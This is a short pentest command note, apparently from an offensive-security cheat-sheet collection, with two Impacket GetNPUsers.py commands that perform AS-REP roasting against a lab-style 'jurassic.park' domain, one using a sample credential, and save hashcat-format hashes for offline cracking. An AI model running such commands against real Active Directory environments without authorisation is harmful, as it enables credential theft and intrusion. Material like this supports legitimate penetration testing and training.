---
id: 775ffc51-cb0f-4716-9067-f346dd8b4007
name: Extract hashes
type: command
executor: bash
data: 'root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile
  usernames.txt -format hashcat -outputfile hashes.asreproast

  root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns
  -request -format hashcat -outputfile hashes.asreproast'
output: null
created_at: '2023-04-06T03:56:04.983402+00:00'
updated_at: '2023-04-10T20:26:39.227036+00:00'
---

# Extract hashes

```bash
root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
